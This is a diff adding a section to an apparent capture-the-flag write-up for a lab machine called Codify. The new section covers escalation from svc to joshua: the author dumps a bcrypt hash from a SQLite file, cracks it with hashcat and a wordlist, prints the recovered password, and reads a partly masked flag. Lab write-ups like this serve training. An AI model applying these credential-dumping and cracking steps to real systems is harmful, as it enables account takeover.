@@ -145,3 +145,100 @@ Once inside we sanitize the tty as always so that it is completely interactive a
 # Privilege Escalation: svc -> joshua
 
 <br />
+
+After some searching we found a sqlite3 database that seems quite interesting:
+
+<br />
+
+```bash
+svc@codify:/var/www/contact$ ls
+index.js  package.json  package-lock.json  templates  tickets.db
+svc@codify:/var/www/contact$ file tickets.db 
+tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
+```
+
+<br />
+
+Obviously we opened it with sqlite3 to inspect it and we discovered the following:
+
+<br />
+
+```bash
+svc@codify:/var/www/contact$ sqlite3 tickets.db 
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+tickets  users  
+sqlite> select * from users;
+3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+```
+
+<br />
+
+Surprise! We have what appears to be a bcrypt Blowfish hash, so we copy it and put it in a file to brute force it with hashcat using the mode 3200, that is the bcrypt Blowfish one:
+
+<br />
+
+```bash
+❯ cat hash
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: hash
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-haswell-AMD Ryzen 7 5825U with Radeon Graphics, 2629/5323 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing backend runtime for device #1. Please be patient...
+```
+
+<br />
+
+After a timeout hashcat is able to crack the hash and we get the password for user joshua:
+
+<br />
+
+```bash
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
+```
+
+<br />
+
+Become user joshua with su and get the user.txt flag:
+
+<br />
+
+```bash
+svc@codify:/var/www/contact$ su joshua
+Password: 
+joshua@codify:/var/www/contact$ cd /home/joshua/
+joshua@codify:~$ cat user.txt 
+e7d945e7588d952e81fe138f88xxxxxx
+```
+
+<br />
+
+# Privilege Escalation: joshua -> root
+
+<br />
+
+
+
